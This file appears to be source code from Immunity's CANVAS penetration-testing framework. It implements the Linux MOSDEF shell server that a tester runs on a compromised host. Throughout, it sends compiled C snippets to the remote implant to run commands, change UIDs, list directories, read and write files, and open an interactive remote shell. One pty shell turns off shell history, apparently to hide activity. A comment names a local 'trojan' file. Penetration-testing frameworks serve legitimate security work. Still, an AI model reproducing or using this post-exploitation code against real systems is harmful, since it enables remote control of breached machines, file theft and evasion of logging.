#! /usr/bin/env python
# -*- coding: utf-8 -*-

"""
CANVAS Linux shell server
Uses MOSDEF for dynmanic assembly component linking
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information
# vim: sw=4 ts=4 expandtab

import os
import re
import sys
import ssl
import copy
import errno
import socket
import logging

from engine import CanvasConfig
from internal import devlog
from exploitutils import * # hem...
from shellserver import unixshellserver
from shellcode import shellcodeGenerator

from canvasengine import canvas_resources_directory as RESOURCE
from MOSDEF.unixremoteresolver import ResolveException

from MOSDEF.mosdef_errno import linux_perror
from MOSDEFShellServer import MSSpathops
from MOSDEFShellServer.MSSgeneric import *
from MOSDEFShellServer.MSSerror import *
from MOSDEFSock import MOSDEFSock

#XXX: or whatever you've used as your trojan filename locally
#XXX: This file needs to exist in CWD locally
trojanfile="hs.exe" # XXX: fix this

class LinuxShellServer(MSSgeneric, unixshellserver):
    def __init__(self):
        # Use POSIX path handling.
        self.path = MSSpathops.MSSPathOperationsPOSIX(self)

    def runcommand(self,command):
        """
        Runs a command via popen
        """
        data=self.popen2(command)
        return data

    def runexitprocess(self):
        """Exit the process"""
        self.exit(1)
        return "Exited the process"

    def getids(self):
        self.log("[+] Getting UIDs");
        uid, euid, gid, egid = self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d" % (uid, euid, gid, egid)

    def pwd(self):
        """
        Gets the current working directory
        """
        return self.getcwd()

    def cd(self, dest):
        """
        Change directory
        """
        #alias for compat with shellserver.py commands
        return self.do_cd(dest)

    def do_cd(self, dest):
        if sint32(self.chdir(dest)) < 0:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s" % dest

    def mkdir(self, pathname, mode = 0700):
        """
        Create a directory.

        @type   pathname: string
        @param  pathname: The pathname of the directory to create.
        @rtype          : string
        @return         : The pathname of the created directory.
        @raise  MSSError: If mkdir() fails on the remote shell.

        """
        vars = {}
        vars["pathname"] = pathname
        vars["mode"] = mode
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendint" as "sendint"
        #import "local","mkdir" as "mkdir"
        #import "string", "pathname" as "pathname"
        #import "int", "mode" as "mode"

        void main()
        {
                int ret;

                ret = mkdir(pathname, mode);
                sendint(ret);
        }
        """,vars)

        self.sendrequest(request)

        # In case of errors, throw an exception.
        error = self.readint(signed=True)
        if error < 0:
            self.leave()
            raise MSSError(-error, "mkdir", os.strerror(-error))

        self.leave()

        return pathname

    def mkdtemp(self, pathname):
        """
        Create a unique temporary directory.

        @type   pathname: string
        @param  pathname: The template of the directory to create.
        @rtype          : string
        @return         : The pathname of the created directory.
        @raise  MSSError: If mkdtemp() fails on the remote shell.
        """
        vars = {}
        vars["pathname"] = pathname
        self.clearfunctioncache()
        request = self.compile("""
        #include <stdlib.h>
        #import "local","sendint" as "sendint"
        #import "local","sendstring" as "sendstring"
        #import "local","mkdir" as "mkdir"
        #import "string", "pathname" as "pathname"

        void main()
        {
            int ret;

            ret = mkdtemp(pathname);
            sendint(ret);

            if (ret == 0) {
                sendstring(pathname);
            }
        }
        """,vars)

        self.sendrequest(request)

        # On failure, we just have the error code, on success we need to
        # read a string of the directory pathname that was created as well.
        #
        # Right now we do not do anything with the error number.  This should
        # be made available through an errno interface later.
        pathname = ""

        # In case of errors, throw an exception.
        error = self.readint(signed=True)
        if error < 0:
            self.leave()
            raise MSSError(-error, "mkdtemp", os.strerror(-error))

        pathname = self.readstring()
        self.leave()

        return pathname

    def rmdir(self, pathname):
        """
        calls rmdir(pathname) and returns the retval
        """
        vars = {}
        vars["pathname"] = pathname
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendint" as "sendint"
        #import "local","rmdir" as "rmdir"
        #import "string", "pathname" as "pathname"

        //start of code
        void main()
        {
            int ret;
            ret = rmdir(pathname);
            sendint(ret);
        }
        """,vars)

        self.sendrequest(request)
        #returns -1 on error
        ret = sint32(self.readint())
        self.leave()

        return ret

    def dounlink(self,filename):
        """
        Unlinks (deletes) a file/dir
        """
        ret=self.unlink(filename)
        if not ret:
            return "%s was unlinked."%filename
        else:
            return "%s was not unlinked due to some kind of error."%filename

    def getcwd(self):
        """
        inputs: none
        outputs: returns the current working directory as a string
        """
        vars = {}
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendstring" as "sendstring"
        #import "local","getcwd" as "getcwd"

        //start of code
        void main()
        {
            int i;
            char dest[2000];
            //getcwd (char * buffer, int size)
            i = getcwd(dest,1024);
            //i has the length of the string.
            sendstring(dest);
        }
        """,vars)

        self.sendrequest(request)
        ret = self.readstring()
        self.leave()

        return ret

    def readlink(self, path, bufsize = 8192):
        vars = {}
        vars["pathname"] = path
        vars["bufsize"] = bufsize
        self.clearfunctioncache()
        request = self.compile("""
        #include <errno.h>
        #import "local","malloc" as "malloc"
        #import "local","free" as "free"
        #import "local","sendstring" as "sendstring"
        #import "local","readlink" as "readlink"
        #import "int", "bufsize" as "bufsize"
        #import "string","pathname" as "pathname"

        //start of code
        void main()
        {
                char *dest;
                int ret;

                // Allocate the requested buffer size.
                dest = malloc(bufsize + 1);
                if (dest == NULL) {
                    sendint(- ENOMEM);
                    return;
                }

                // Resolve the symbolic link.
                ret = readlink(pathname, dest, bufsize);
                if (ret < 0) {
                    free(dest);
                    sendint(ret);
                    return;
                }
                // readlink() does not 0-terminate.
                dest[ret] = 0;

                // Success.  Send back the return value and string.
                sendint(ret);
                sendstring(dest);
                free(dest);
        }
        """,vars)

        self.sendrequest(request)

        # In case of errors, throw an exception.
        error = self.readint(signed=True)
        if error < 0:
            self.leave()
            raise MSSError(-error, "readlink", os.strerror(-error))

        # Success, so we read the resulting string.
        ret = self.readstring()
        self.leave()

        return ret

    def setuid(self, uid):
        """
        calls setuid(uid) - returns that integer
        """
        vars = {}
        vars["uid"]=uid
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendint" as "sendint"
        #import "local","setuid" as "setuid"
        #import "int", "uid" as "uid"

        //start of code
        void main()
        {
            int ret;
            ret = setuid(uid);
            sendint(ret);
        }
        """,vars)

        self.sendrequest(request)
        #returns -1 on error
        ret = sint32(self.readint())
        self.leave()

        return ret

    def umask(self, mask):
        """
        calls umask(mask) - returns that integer
        """
        vars = {}
        vars["mask"]=mask
        self.clearfunctioncache()
        request = self.compile("""
        #import "local","sendint" as "sendint"
        #import "local","umask" as "umask"
        #import "int", "mask" as "mask"

        //start of code
        void main()
        {
            int ret;
            ret = umask(mask);
            sendint(ret);
        }
        """,vars)

        self.sendrequest(request)
        #returns -1 on error
        ret = sint32(self.readint())
        self.leave()
        return ret

    def shellshock(self, logfile=None, shell='/bin/sh'):
        """
        Implements an interactive shell, like a remote bash shell
        """

        vars={}
        vars["mosdefd"]  = self.fd
        vars["shell"]    = shell

        code="""
#import "int",    "mosdefd" as "mosdefd"
#import "string", "shell" as "shell"

#import "local", "pipe" as "pipe"
#import "local", "dup2" as "dup2"
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "local", "write" as "write"
#import "local", "sendstring" as "sendstring"
#import "local", "sendint" as "sendint"
#import "local", "select" as "select"
#import "local", "memset" as "memset"
#import "local", "exit" as "exit"

void main()
{
  char *exec[3];
  char in[512];
  char out[512];

  int pid;
  int rfd;
  int wfd;
  int len;
  int n;
  int i;
  int div;
  int tmp;
  int rfdindex;
  int mosindex;
  int mosoffset;
  int rfdoffset;
  int crfds;
  int mosisset;

  int localmask[32];
  int write_pipe[2];
  int read_pipe[2];

  exec[0] = shell;
  exec[1] = "-i";
  exec[2] = 0;

  pipe(write_pipe);
  pipe(read_pipe);

  pid = fork();

  if (pid == 0)
  {
    close(0);
    close(1);
    close(2);
    dup2(write_pipe[0], 0);
    dup2(read_pipe[1], 1);
    dup2(read_pipe[1], 2);
    close(read_pipe[0]);
    execve(exec[0], exec, 0);
    exit(1);
  }

  close(read_pipe[1]);
  close(write_pipe[0]);
  rfd = read_pipe[0];
  wfd = write_pipe[1];

  rfdindex = 0;

  if (rfd > 31)
  {
    rfdindex = rfd;
    while(rfdindex > 31)
    {
      rfdindex = rfdindex - 32;
    }
  }
  else
  {
    rfdindex = rfd;
  }
  mosindex = 0;
  if (mosdefd > 31) {
    mosindex = mosdefd;
    while(mosindex > 31) {
      mosindex = mosindex - 32;
    }
  }
  else {
    mosindex = mosdefd;
  }

  i = 0;
  div = rfd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  rfdoffset = i;
  i = 0;
  div = mosdefd;
  while (div > 31)
  {
      i = i+1;
      div = div - 32;
  }
  mosoffset = i;

  while(1)
  {
    memset(&localmask, 0, 128);
    localmask[rfdoffset] = 1<<rfdindex;
    tmp = localmask[mosoffset];
    div = 1<<mosindex;
    localmask[mosoffset] = tmp | div;

    // oi vey, ok both in mask

    if (rfd > mosdefd)
    {
      n = rfd + 1;
    }
    else
    {
      n = mosdefd + 1;
    }

    crfds = 0;
    mosisset = 0;
    if (select(n, &localmask, 0, 0, 0) > 0)
    {

// hahaha, i know...i reeeealllly need to do some proper select macros :P

      tmp = localmask[mosoffset];
      mosisset = tmp>>mosindex;
      mosisset = mosisset & 1;
      tmp = localmask[rfdoffset];
      crfds = tmp>>rfdindex;
      crfds = crfds & 1;

      if (mosisset == 1)
      {
        memset(&out, 0, 512);
        len = read(mosdefd, out, 511);
        if (len > 0)
        {
          write(wfd, out, len);
        }
      }
      if (crfds == 1)
      {
        memset(&in, 0, 512);
        len = read(rfd, in, 511);
        if (len > 0)
        {
          sendstring(in);
        }
        else
        {
          sendint(0);
          return;
        }
      }
    }
    else
    {
      sendint(0);
      return;
    }
  }
}
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        ret = self.shellshock_loop(endian = self.Endianness, logfile=logfile)

        self.leave()

    def popen2(self, command, shell='/bin/sh'):
        """
        runs a command and returns the result
        Note how it uses TCP's natural buffering, and
        doesn't require a ping-pong like protocol.
        """

        vars = {}
        vars["command"] = command
        vars["shell"]   = shell

        code="""
        #import "string", "command" as "command"
        #import "string", "shell" as "shell"

        #import "local","pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "memset" as "memset"
        #import "local", "wait4" as "wait4"

        //#import "local", "debug" as "debug"
        #import "local", "sendstring" as "sendstring"


        void main()
        {
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          char **envp;
          int ret;
          int pid;

          //pipes[0] is now for reading and pipes[1] for writing

          envp    = 0;
          argv[0] = shell;
          argv[1] = "-c";
          argv[2] = command;
          argv[3] = 0;

           //now we fork and exec and read from the socket until we are done
           ret=pipe(pipes);
           ret=pipe(bpipes);
           pid=fork();
           if (pid==0)
           {
              //child
              close(0);
              close(1);
              close(2);
              ret=dup2(pipes[0],0);
              ret=dup2(bpipes[1],1);
              ret=dup2(bpipes[1],2);
              close(bpipes[0]);
              execve(argv[0],argv,envp);
              exit(1); //in case it failed
           }
           ret=close(bpipes[1]);
           ret=close(pipes[0]);
           memset(buf,0,1001);
           //debug();
           while (read(bpipes[0],buf,1000)!=0) {
              sendstring(buf);
              memset(buf,0,1001);
           }
           //debug();
           //send blank string...
           sendstring(buf);
           close(pipes[1]);
           close(bpipes[0]);
           //we do this twice in the event that
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           wait4(-1, 0, 1, 0); //wnohang is 1
           wait4(-1, 0, 1, 0); //wnohang is 1
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        tmp=self.readstring()
        data=tmp
        while tmp != "":
            tmp=self.readstring()
            data+=tmp
        self.leave()

        return data

    def dodir(self, directory):
        """
        List the contents of a directory
        """

        if directory[-1] != "/": directory += "/"
        vars = {'directory' : directory}

        code = """
        #include <stdlib.h>
        #include <sys/stat.h>
        #include <errno.h>
        #include <fcntl.h>

        #import "local", "sendint" as "sendint"
        #import "local", "sendshort" as "sendshort"
        #import "local", "sendstring" as "sendstring"
        #import "local", "getdents" as "getdents"
        #import "local", "open" as "open"
        #import "local", "close_no_eintr" as "close_no_eintr"
        #import "local", "write" as "write"
        #import "local", "strcpy" as "strcpy"
        #import "local", "strcat" as "strcat"
        #import "local", "stat" as "stat"

        #import "string", "directory" as "directory"

        struct dirent {
            int   d_ino;
            int   d_off;
            short d_reclen;
            char  d_name[256];
        };

        void main ()
       {
          int fd;
          int ret;
          int bpos;
          int run;

          char buf[1024];
          char filename[8096];


          struct dirent *dirptr;
          struct stat tats;

          run  = 1;
          fd = open(directory, O_DIRECTORY|O_RDONLY);

          if (fd < 0) {
              sendint(-1);
          } else {
              sendint(fd);

              while (run != 0) {
                   ret = getdents(fd, &buf, 1024);

                   if (ret <= 0) {
                       sendint(ret);
                       close_no_eintr(fd);
                       run = 0;
                   } else {
                       for (bpos = 0; bpos < ret; bpos = bpos + dirptr->d_reclen) {
                           dirptr = buf + bpos;
                           sendint(1);
                           sendstring(dirptr->d_name);

                           strcpy(filename, directory);
                           strcat(filename, dirptr->d_name);
                           stat(filename , &tats);
                           sendshort(tats.st_mode);
                           sendshort(tats.st_uid);
                           sendshort(tats.st_gid);
                           sendint(tats.st_size);
                           sendint(tats.st_mtime);
                       }
                   }
              }
          }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)

        if self.readint(signed=True) < 0:
            self.log('[EE] open(2) failed on %s, aborting' % directory)
            self.leave()
            return []

        files = []

        while self.readint(signed=True) > 0:
            d_name  = self.readstring()
            statbuf = self.readstruct([("s", "st_mode"),
                                       ("s", "st_uid"),
                                       ("s", "st_gid"),
                                       ("l", "st_size"),
                                       ("l", "st_mtime")])
            files.append((d_name, statbuf))

        self.leave()
        return files

    def prctl(self, option, arg2 = 0, arg3 = 0, arg4 = 0, arg5 = 0):
        vars = {'option': option, 'arg2': arg2, 'arg3': arg3, 'arg4': arg4, 'arg5': arg5}
        code = """
        #import "local","sendint" as "sendint"
        #import "local","prctl" as "prctl"
        #import "int", "option" as "option"
        #import "int", "arg2" as "arg2"
        #import "int", "arg3" as "arg3"
        #import "int", "arg4" as "arg4"
        #import "int", "arg5" as "arg5"
        void main()
        {
             int ret;

             ret = prctl(option, arg2, arg3, arg4, arg5);

             sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret

    def access(self, path, mode):
        """Returns true if path can be accessed with mode, false otherwise."""
        vars = { 'path' : path, 'mode' : mode }
        code = """
        #include <unistd.h>
        #import "local","sendint" as "sendint"
        #import "string", "path" as "path"
        #import "int","mode" as "mode"
        void main()
        {
                int ret;

                ret = access(path, mode);
                sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()

        return ret >= 0


    def lscpu(self):
        """
        Returns the attributes of the CPU 0 as well as the number of logicial cores.
        """

        cpuinfo = "/proc/cpuinfo"
        vars = {'cpuinfo' : cpuinfo}

        code = """
        #include <stdlib.h>
        #include <sys/stat.h>
        #include <errno.h>
        #include <fcntl.h>

        #import "local", "open" as "open"
        #import "local", "read" as "read"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"

        #import "string", "cpuinfo" as "cpuinfo"

        void main()
        {
            char buf[4096];
            int ret;
            int fd;

            fd = open(cpuinfo, O_RDONLY);
            if (fd < 0) {
                sendint(-1);
            } else {
                sendint(fd);
                ret = read(fd, buf, 4096);
                sendint(ret);
                if (ret > 0)
                {
                    sendblock2self(buf, ret);
                }
            }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd = self.readint(signed=True)
        if fd < 0:
            self.log_error('open(2) failed on %s, aborting' % cpuinfo)
            self.leave()
            return None

        lscpu_data = {}
        ret = self.readint(signed=True)
        if ret > 0:
            raw_data = self.readblock()
            lines = raw_data.split('\n\n')
            if len(lines) < 2:
                self.log_error('Parsing error')
                self.leave()
                return None
            lscpu_data['logical cores'] = len(lines) - 1
            for l in lines[0].split('\n'):
                x = l.split('\t:')
                if len(x) != 2:
                    continue
                name = x[0].lstrip().rstrip()
                val = x[1].lstrip().rstrip()
                if not lscpu_data.has_key(name):
                    lscpu_data[name] = val
        self.leave()
        return lscpu_data

    def uname(self):
        code = """
        #import "local", "uname" as "uname"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        void main()
        {
            char buf[390];
            int ret;

            ret = uname(buf);
            sendint(ret);
            if (ret == 0)
            {
                sendblock2self(buf, 390);
            }

        }
        """
        self.clearfunctioncache()
        request=self.compile(code)
        self.sendrequest(request)
        rv = self.readint(signed=True)
        if rv == 0:
            elements = ["sysname", "nodename", "release", "version", "machine", "domain"]
            uname = {}
            data = self.readblock()
            i = 0
            for c in data.split("\x00"):
                if len(c) > 0:
                    uname[elements[i]] = c
                    i+= 1
            rv = uname
        else:
            rv = None

        self.leave()
        return rv

    def getpagesize(self):
        _SC_PAGESIZE = self.libc.getdefine('_SC_PAGESIZE')
        # TODO: implement sysconf()
        #
        # getpagesize = sysconf(_SC_PAGESIZE);
        #
        # for Linux/x86 pagesize=4k
        if self.arch.upper() == 'X86':
            return 4096
        return _SC_PAGESIZE

    def xx_getids(self):
        uid,euid,gid,egid=self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d"%(uid,euid,gid,egid)

    def fexec(self,command,args,env):
        """
        calls fork execve
        """

        code=""
        vars={}
        vars["command"]=command
        i=0
        for a in args:
            vars["arg%d"%i]=a
            code+="#import \"string\",\"arg%d\" as \"arg%d\""%(i,i)
            i+=1
        i=0
        for e in env:
            vars["env%d"%i]=e
            code+="#import \"string\",\"env%d\" as \"env%d\""%(i,i)
            i+=1
        maxargs=len(args)
        maxenv=len(env)

        code+="""
          //start
#import "local", "close" as "close"
#import "local", "execve" as "execve"
#import "local", "read" as "read"
#import "local", "fork" as "fork"
#import "string", "command" as "command"

#import "local", "debug" as "debug"
#import "local", "exit" as "exit"
#import "local", "memset" as "memset"
#import "local", "wait4" as "wait4"


void main()
{
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[ARGVNUM];
          char *envp[ENVNUM];
          int ret;
          int pid;

          //pipes[0] is now for reading and pipes[1] for writing

          """
        code=code.replace("ARGVNUM",str(maxargs+1))
        code=code.replace("ENVNUM",str(maxenv+1))
        code+="envp[%d]=0;\n"%maxenv
        code+="argv[%d]=0;\n"%maxargs
        for i in range(0,maxargs):
            code+="argv[%d]=arg%d;\n"%(i,i)
        for i in range(0,maxenv):
            code+="envp[%d]=env%d;\n"%(i,i)
        code+="""
           //now we fork and exec and read from the socket until we are done
           pid=fork();
           if (pid==0)
           {
              //child
              close(1);
              close(2);
              execve(command,argv,envp);
              exit(1); //in case it failed
           }

           //we do this twice in the event that
           //our previous process did not exit by now...
           //we could listen for pid, but instead, we listen for any process
           //that is a zombie
           wait4(-1, 0, 1, 0); //wnohang is 1
           wait4(-1, 0, 1, 0); //wnohang is 1
           }

        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()

        return

    ############
    #PTY FUNCTIONS
    ############

    def ioctlgetint(self,fd,ioctlval,myint=0):
        vars={}
        vars["fd"] = fd
        vars["myint"] = myint
        vars["ioctlval"] = ioctlval
        code="""
        #import "local","sendint" as "sendint"
        #import "local","ioctl" as "ioctl"
        #import "int", "fd" as "fd"
        #import "int", "ioctlval" as "ioctlval"
        #import "int", "myint" as "myint"
        void main()
        {
             int ret;
             int i;

             i = myint;
             ret = ioctl(fd,ioctlval,&i);
             sendint(ret);
             sendint(i);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        i = self.readint()
        self.leave()
        return ret,i

    def ioctlint(self,fd,ioctlval,myint):
        ret,retval=self.ioctlgetint(fd,ioctlval,myint)
        return ret

    def findpts(self):
        master=self.open("/dev/ptmx",self.libc.getdefine('O_RDWR'))
        if master==0:
            return 0,None
        ret=self.grantpt(master)
        ret=self.unlockpt(master)
        slave=self.ptsname(master)
        return master,slave

    def ptsname(self,fd):
        devlog("linux","ptsname %d"%fd)
        ret,retval=self.ioctlgetint(fd,self.libc.getdefine('TIOCGPTN'))
        devlog("linux","ptsname %d ret=%d retval=%d"%(fd,ret,retval))

        if ret:
            return None
        else:
            return "/dev/pts/%d"%retval

    def grantpt(self,fd):
        devlog("linux","grantpt called %d"%fd)
        ret,retval=self.ioctlgetint(fd,self.libc.getdefine('TIOCGPTN'))
        devlog("linux","grantpt returned %x:%x"%(ret,retval))
        return 0

    def unlockpt(self,fd):
        devlog("linux","unlockpt called %d"%fd)
        TIOCSPTLCK=0x40045431
        ret=self.ioctlint(fd,TIOCSPTLCK,0)
        if not ret:
            return -1

        return ret

    def sh_tty_child(self, master, slavedev, shell='/bin/sh'):
        vars             = {}
        vars["master"]   = master
        vars["slavedev"] = slavedev
        vars["shell"]    = shell

        code             = """
        #import "local",  "sendint" as "sendint"
        #import "local",  "sendshort" as "sendshort"
        #import "local",  "ioctl" as "ioctl"
        #import "int",    "master" as "master"
        #import "string", "slavedev" as "slavedev"
        #import "string", "shell" as "shell"

        #import "local",  "setsid" as "setsid"
        #import "local",  "execve" as "execve"
        #import "local",  "fork" as "fork"
        #import "local",  "dup2" as "dup2"
        #import "local",  "close" as "close"
        #import "local",  "open" as "open"

        void main()
        {
             int ret;
             int i;
             int access;
             char *argv[2];
             char *envv[3];
             int pid;
             int slave;
             char * p;

             pid=fork();
             if (pid==0) {
                access=2; // O_RDWR
                ret=setsid();
                if (ret<0) {
                   return 0;
                }

                slave=open(slavedev,access,0);
                if (slave < 0) {
                   return 0;
                }
                //0x5302 == I_PUSH
                // dup2(slave,slave);
                //this is solaris code we've commented out
                //p="ptem";
                //ioctl(slave, 0x5302, p);
                //p="ldterm";
                //ioctl(slave, 0x5302, p);
                close(master);
                dup2(slave,0);
                dup2(slave,1);
                dup2(slave,2);
                if (slave>2) {
                   close(slave);
                }
                //some tcsetattr stuff here
                argv[0]="sh";
                argv[1]=0;
                envv[0]="TERM=xterm";
                envv[1]="HISTFILE=/dev/null";
                envv[2]=0;
                execve(shell, argv, envv);
            }
            return 0;
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()


    ###################################################################

    def readfromfd(self,fd,filesize):
        """ Reads from a open fd on the remote host, filesize of 0 reads untill EOF """

        # XXX: this code is lacking error checking and redundancy logic !

        vars = {}
        vars["bufsize"] = filesize
        vars["socketfd"] = self.fd
        vars["filefd"] = fd

        code="""
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        #import "local", "debug" as "debug"

        void main () {
          char buf[1024];
          char *p;
          char *i;
          int left;
          int ret;

          if (bufsize == -1) // -1 reads untill EOF
          {
              ret = 1;
              // read untill EOF (ret == 0)
              while(ret != 0)
              {
                  // A MOSDEF BLIND EOF PROTOCOL

                  // 1024 blocks, rets are appended in front
                  // ret of 0 == EOF, otherwise treat as len
                  // this protocol is handled in reliableread
                  // and is needed for 0 sized files such as
                  // /proc/mounts .. this will also allow our
                  // download to work on such files ;)

                  p = buf;
                  p = p + 4;
                  ret = read(filefd, p, 1020);
                  i = &ret;
                  p = p - 4;
                  // XXX: deal with node endianness at the struct unpack
                  p[0] = i[0];
                  p[1] = i[1];
                  p[2] = i[2];
                  p[3] = i[3];
                  // make ret the first 4 bytes
                  writeblock(socketfd, buf, 1024);
              }
              return;
          }
          else
          {
              // original readfromfd code .. serio needs a rewrite for redundancy

              left = bufsize;
              while (left > 1024)
              {
                  read(filefd, buf, 1024);
                  writeblock(socketfd, buf, 1024);
                  left = left - 1024;
              }
              if (left > 0)
              {
                  read(filefd, buf, left);
                  writeblock(socketfd, buf, left);
              }
          }

        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        data = self.readbuf(filesize)

        self.leave()
        return data

    def writetofd(self,fd,data):
        """
        Writes all the data in data to fd
        """

        vars={}
        vars["bufsize"]=len(data)
        vars["socketfd"]=self.fd
        vars["filefd"]=fd

        # XXX we don't check if write() succeeded here...
        code="""
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"
        //#import "local", "debug" as "debug"
        #import "int", "bufsize" as "bufsize"
        #import "int", "socketfd" as "socketfd"
        #import "int", "filefd" as "filefd"

        void main ()
        {
            char buf[1001];
            int left;
            int ret;

            left = bufsize;

            while (left > 1000)
            {
                readblock(socketfd,buf,1000);
                ret = write(filefd,buf,1000);
                // for linux on error we return 0-errno :>
                if (ret < 0)
                {
                    left = 0;
                }
                else
                {
                    left = left-1000;
                }
            }

            if (left > 0)
            {
                readblock(socketfd,buf,left);
                ret = write(filefd,buf,left);
                // XXX: error check missing
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()

        return

    def setblocking(self,fd,blocking):
        code="""
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "int", "sock" as "sock"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"

        void main() {
          int opts;

          opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
          """
        if blocking:
            #set blocking by clearing the nonblocking flag
            code+="opts=opts & O_BLOCK;\n"
        else:
            #set nonblocking
            code+="opts=opts | O_NONBLOCK;\n"
        code+="""
          fcntl(sock,F_SETFL,opts);
        }
        """
        vars = self.libc.getdefines()
        vars["sock"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def setsockopt(self,sockfd,option,arg):
        code="""
        #import "local", "setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sockfd" as "sockfd"

        void main() {
           // XXX: 5 args .. deal with optlen .. &arg is *optval
           int i;
           i = arg;
           setsockopt(sockfd,level,option,&i,4);
        }
        """
        vars = self.libc.getdefines()
        vars["option"]=option
        vars["arg"]=arg
        vars["sockfd"]=sockfd
        vars["level"] = vars['SOL_SOCKET']
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "local", "recv" as "recv"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"

        void main()
        {
            int i;
            char buf[1000];
            int wanted;

            //flags set to zero here
            wanted = length;
            while (wanted > 0 )
            {
                if (wanted < 1000)
                {
                    i = recv(fd, buf, wanted, 0);
                }
                else
                {
                   i = recv(fd, buf, 1000, 0);
                }
                // error handling .. 0-errno is returned from syscall
                if (i < 0)
                {
                    writeblock2self(buf,0);
                    wanted = 0;
                }
                else
                {
                    writeblock2self(buf,i);
                    wanted = wanted - i;
                }

            }
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["length"] = int(length)
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message

    def recv_lazy(self,fd,timeout=None,length=1000):
        """
        Get whatever is there
        We return a "" when there is nothing on the socket

        """
        #print "In recv_lazy fd=%d"%fd
        if timeout==None:
            timeout=0 #immediately return
        if length>1000:
            length=1000

        code="""
        #include <sys/poll.h>
        #import "local", "recv" as "recv"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"

        void main()
        {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;

            ufds.fd = fd;
            ufds.events = 1;

            //timeout is in ms
            i = poll(&ufds,1,timeout);
            r = ufds.revents & 9; //AND with POLLIN and POLLERR

            // send poll result not revents!
            sendint(i);

            if (r > 0)
            {
                //flags set to zero here
                i = recv(fd, buf, length, 0);
                sendint(i);

                if (i > 0)
                {
                    sendblock2self(buf, i);
                }
            }
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["timeout"] = timeout
        vars["length"] = length
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        poll_result = sint32(self.readint())
        recv_result = 1 #fake result

        if poll_result > 0:
            recv_result = sint32(self.readint())
            if recv_result > 0:
                buffer = self.readblock()

        self.leave()

        #raise exceptions on exceptional conditions like timeout or socket errors
        if poll_result <= 0:
            #because we are lazy recv, we don't raise an exception here, but we do return "" as our data
            #this would only be valid normally if size was 0 which is used to test a socket
            #print "Timeout"
            #raise timeoutsocket.Timeout
            buffer = ""

        if recv_result <= 0:
            raise socket.error

        #buffer should exist!
        return buffer

    def accept(self,fd):
        devlog('linuxMosdefShellServer::accept()', "fd=%d" % fd)
        code="""
        #import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        #include "socket.h"

        void main()
        {
            int i;
            struct sockaddr_storage ss;
            struct sockaddr_in *sa;

            sa = &ss;
            int len;
            len = 128;
            memset(&ss, 0, 128);
            i = accept(fd, sa, &len);
            sendint(i);
            sendint(sa->addr);
        }
        """
        vars={}
